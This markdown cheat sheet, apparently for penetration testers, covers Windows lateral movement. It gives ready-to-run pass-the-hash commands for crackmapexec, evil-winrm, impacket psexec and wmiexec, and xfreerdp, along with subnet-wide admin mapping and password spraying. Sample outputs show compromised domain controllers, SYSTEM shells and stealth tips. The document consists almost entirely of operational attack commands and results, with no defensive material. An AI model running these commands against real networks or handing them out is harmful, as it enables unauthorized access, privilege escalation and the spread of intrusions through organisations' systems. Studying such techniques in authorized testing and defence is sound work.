# LATERAL MOVEMENT

### Pass the hash (crackmapexec)

Authenticate with NTLM hash — No password needed

```bash
crackmapexec smb <target> -u <user> -H <ntlm_hash>
```

<details>
<summary>Example Output</summary>

```
crackmapexec smb 10.10.10.0/24 -u administrator -H '31d6cfe0d16ae931b73c59d7e0c089c0'
SMB  10.10.10.5   DC01   [+] Pwn3d!
SMB  10.10.10.20  WEB01  [+] Pwn3d!
SMB  10.10.10.21  DB01   [+] Pwn3d!
SMB  10.10.10.22  FILE01 [-] STATUS_LOGON_FAILURE
(Spray hash across entire domain subnet)
```
</details>

---

### Pass the hash (evil-winrm)

Interactive shell with hash — If WinRM is open (5985)

```bash
evil-winrm -i <target> -u <user> -H <ntlm_hash>
```

<details>
<summary>Example Output</summary>

```
evil-winrm -i 10.10.10.5 -u administrator -H '31d6cfe0d16ae931b73c59d7e0c089c0'
*Evil-WinRM* PS C:\Users\Administrator> whoami
corp\administrator
*Evil-WinRM* PS> hostname
DC01
(Interactive PowerShell on the DC with hash)
```
</details>

---

### Pass the hash (psexec)

Get SYSTEM shell — Writes to ADMIN$ share

```bash
impacket-psexec <domain>/<user>@<target> -hashes :<ntlm_hash>
```

<details>
<summary>Example Output</summary>

```
impacket-psexec corp.local/administrator@10.10.10.5 -hashes :31d6cfe0d16ae931b...
[*] Requesting shares on 10.10.10.5
[*] Found writable share ADMIN$
C:\Windows\system32> whoami
nt authority\system
```
</details>

---

### Pass the hash (wmiexec)

Semi-interactive shell — Stealthier than psexec

```bash
impacket-wmiexec <domain>/<user>@<target> -hashes :<ntlm_hash>
```

<details>
<summary>Example Output</summary>

```
impacket-wmiexec corp.local/administrator@10.10.10.5 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
[*] SMBv3.0 dialect used
C:\> whoami
corp\administrator
(Stealthier than psexec - uses WMI, no service created)
```
</details>

---

### RDP with hash

GUI access with hash — Restricted Admin mode must be on

```bash
xfreerdp /u:<user> /pth:<ntlm_hash> /v:<target>
```

<details>
<summary>Example Output</summary>

```
xfreerdp /u:admin /pth:31d6cfe0d... /v:10.10.10.5
[INFO] Connected to 10.10.10.5
(Full GUI desktop, no password needed)
Note: Restricted Admin must be enabled on target
```
</details>

---

### Check admin access on subnet

Which machines can you admin? — Map your access

```bash
crackmapexec smb <subnet>/24 -u <user> -p <pass> --local-auth
```

<details>
<summary>Example Output</summary>

```
crackmapexec smb 10.10.10.0/24 -u john -p Password1
SMB  10.10.10.5   445  DC01   [+] corp\john (Pwn3d!)
SMB  10.10.10.20  445  WEB01  [+] corp\john (Pwn3d!)
SMB  10.10.10.21  445  DB01   [-] corp\john
(Admin on DC01 and WEB01)
```
</details>

---

### Spray cracked creds everywhere

Password reuse across machines — People reuse passwords

```bash
crackmapexec smb <subnet>/24 -u <user> -p <pass>
```

<details>
<summary>Example Output</summary>

```
crackmapexec smb 10.10.10.0/24 -u svc_sql -p 'SQLServiceP@ss!'
10.10.10.5  [+] (Pwn3d!)
10.10.10.20 [+] (Pwn3d!)
10.10.10.21 [+] (Pwn3d!)
(Service account has admin on multiple servers)
```
</details>

---
